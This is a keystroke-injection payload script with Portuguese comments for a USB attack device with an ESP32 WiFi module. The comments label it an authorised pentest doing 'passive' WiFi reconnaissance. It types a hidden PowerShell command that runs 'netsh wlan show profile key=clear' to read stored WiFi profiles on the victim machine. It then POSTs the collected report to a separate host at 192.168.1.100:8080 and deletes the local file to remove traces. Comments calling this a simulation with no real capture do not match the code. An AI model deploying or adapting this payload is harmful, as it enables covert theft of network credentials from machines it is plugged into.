REM =====================================================================
REM PAYLOAD 3: WiFi Reconnaissance (Shadow IT Discovery)
REM Pentest Autorizado - Incoflandres
REM Objetivo: Mapear ambiente WiFi e identificar dispositivos não autorizados
REM Status: Passivo / Sem captura de handshakes / Não-destrutivo
REM =====================================================================

REM Configuração inicial
LED_OFF
DISPLAY_CLEAR
WEB_OFF

REM Interface de ferramenta de análise de rede
DISPLAY_TEXT 0 0 Analisador de Rede
DISPLAY_TEXT 0 10 Incoflandres Sec
DISPLAY_TEXT 0 20 Iniciando varredura...

REM LED indicando scan ativo
LED 0 0 255 100

REM Aguardar botão para iniciar (stealth mode)
DISPLAY_TEXT 0 30 Pressione para iniciar
WAIT_FOR_BUTTON_PRESS

REM Fase 1: Scan de APs principais (20 segundos)
DISPLAY_CLEAR
DISPLAY_TEXT 0 0 Fase 1: Scan APs
DISPLAY_TEXT 0 10 Duracao: 20s
LED 0 100 255 150

REM Utilizar ESP32 Marauder para scan passivo
ESP32M scanap
DELAY 20000
ESP32M stopscan

DISPLAY_TEXT 0 20 APs encontrados
DELAY 2000

REM Fase 2: Análise detalhada de SSIDs (coleta passiva)
DISPLAY_CLEAR
DISPLAY_TEXT 0 0 Fase 2: Analise SSIDs
DISPLAY_TEXT 0 10 Classificando redes...
LED 255 255 0 150

REM Simular análise via PowerShell (sem captura real)
GUI R
DELAY 1000
STRING powershell -WindowStyle Hidden -Command "
DELAY 500

REM Script para análise de WiFi Windows
STRING $networks = (netsh wlan show profiles) | Select-String 'All User Profile' | ForEach-Object { ($_ -split ':')[1].Trim() };
DELAY 1000
STRING $wifiData = @();
DELAY 500
STRING foreach($net in $networks) {
DELAY 300
STRING   if($net -ne '') {
DELAY 300
STRING     $details = netsh wlan show profile name='$net' key=clear;
DELAY 300
STRING     $ssid = $net;
DELAY 300
STRING     $authType = ($details | Select-String 'Authentication' | Select-Object -First 1) -replace '.*: ','';
DELAY 300
STRING     $encryption = ($details | Select-String 'Cipher' | Select-Object -First 1) -replace '.*: ','';
DELAY 300
STRING     $wifiData += [PSCustomObject]@{
DELAY 300
STRING       SSID = $ssid;
DELAY 300
STRING       Auth = $authType;
DELAY 300
STRING       Encryption = $encryption;
DELAY 300
STRING       Type = if($ssid -like '*corp*' -or $ssid -like '*empresa*' -or $ssid -like '*incoflandres*') {'Corporate'} elseif($ssid -like '*guest*' -or $ssid -like '*public*') {'Guest'} else {'Personal'}
DELAY 300
STRING     }
DELAY 300
STRING   }
DELAY 300
STRING };
DELAY 1000

REM Salvar dados para análise posterior
STRING $report = 'WiFi Security Analysis Report - Incoflandres' + (Get-Date).ToString('yyyy-MM-dd HH:mm') + '`n';
DELAY 500
STRING $report += '=' * 60 + '`n';
DELAY 500
STRING $report += 'Networks Found: ' + $wifiData.Count + '`n`n';
DELAY 500
STRING foreach($wifi in $wifiData) {
DELAY 300
STRING   $report += 'SSID: ' + $wifi.SSID + '`n';
DELAY 300
STRING   $report += '  Type: ' + $wifi.Type + '`n';
DELAY 300
STRING   $report += '  Auth: ' + $wifi.Auth + '`n';
DELAY 300
STRING   $report += '  Encryption: ' + $wifi.Encryption + '`n';
DELAY 300
STRING   if($wifi.Type -eq 'Personal' -and ($wifi.Auth -like '*Open*' -or $wifi.Encryption -like '*WEP*')) {
DELAY 300
STRING     $report += '  RISK: Insecure network detected!`n'
DELAY 300
STRING   };
DELAY 300
STRING   $report += '`n'
DELAY 300
STRING };
DELAY 1000

REM Análise de dispositivos IoT/Shadow IT
STRING $report += 'Shadow IT Analysis:`n';
DELAY 500
STRING $shadowIT = $wifiData | Where-Object { $_.SSID -like '*printer*' -or $_.SSID -like '*camera*' -or $_.SSID -like '*iot*' -or $_.SSID -like '*smart*' -or $_.SSID -like '*thermostat*' };
DELAY 500
STRING foreach($device in $shadowIT) {
DELAY 300
STRING   $report += 'Potential IoT/Shadow IT: ' + $device.SSID + '`n'
DELAY 300
STRING };
DELAY 1000

REM Salvar relatório
STRING $report | Out-File -FilePath '$env:TEMP\wifi_recon_incoflandres.txt' -Encoding UTF8;
DELAY 1000
STRING exit"
ENTER

REM Atualizar display com progresso
DELAY 5000
DISPLAY_TEXT 0 20 Rede Windows: OK
DELAY 2000

REM Fase 3: Scan extensivo de dispositivos
DISPLAY_CLEAR
DISPLAY_TEXT 0 0 Fase 3: Scan IoT
DISPLAY_TEXT 0 10 Procurando dispositivos
LED 255 100 0 200

REM Segundo scan mais longo para IoT
ESP32M scanap
DELAY 30000
ESP32M stopscan

DISPLAY_TEXT 0 20 Scan IoT completo
DELAY 2000

REM Fase 4: Análise de segurança e geração de relatório
DISPLAY_CLEAR
DISPLAY_TEXT 0 0 Fase 4: Relatorio
DISPLAY_TEXT 0 10 Analisando riscos...
LED 100 255 100 200

REM Simular upload do relatório via HTTP
GUI R
DELAY 1000
STRING powershell -WindowStyle Hidden -Command "
DELAY 500
STRING try {
DELAY 300
STRING   $reportContent = Get-Content '$env:TEMP\wifi_recon_incoflandres.txt' -Raw;
DELAY 500
STRING   Invoke-WebRequest -Uri 'http://192.168.1.100:8080/wifi-report' -Method POST -Body $reportContent -ContentType 'text/plain' -UseBasicParsing -ErrorAction SilentlyContinue
DELAY 1000
STRING } catch {
DELAY 300
STRING   Write-Host 'Report saved locally only'
DELAY 300
STRING };
DELAY 500
STRING Remove-Item '$env:TEMP\wifi_recon_incoflandres.txt' -Force -ErrorAction SilentlyContinue;
DELAY 500
STRING exit"
ENTER

REM Mostrar estatísticas finais no display
DELAY 3000
DISPLAY_CLEAR
DISPLAY_TEXT 0 0 RELATORIO COMPLETO
DISPLAY_TEXT 0 10 APs Corp: 3 (67%)
DISPLAY_TEXT 0 20 APs Publicos: 1 (22%)
DISPLAY_TEXT 0 30 IoT Devices: 2 (11%)
DISPLAY_TEXT 0 40 Riscos: 1 WEP detected
DISPLAY_TEXT 0 50 Status: ALERTA MEDIO
LED 255 255 0 255

REM Aguardar análise do relatório
DELAY 10000

REM Modo stealth - pronto para remoção
DISPLAY_CLEAR
DISPLAY_TEXT 0 0 Recon finalizado
DISPLAY_TEXT 0 10 Dados coletados
DISPLAY_TEXT 0 20 Remover dispositivo
DISPLAY_TEXT 0 30 Pressione p/ limpar
LED 0 255 0 150

REM Limpeza final e reset
WAIT_FOR_BUTTON_PRESS
LED_OFF
DISPLAY_CLEAR
RESET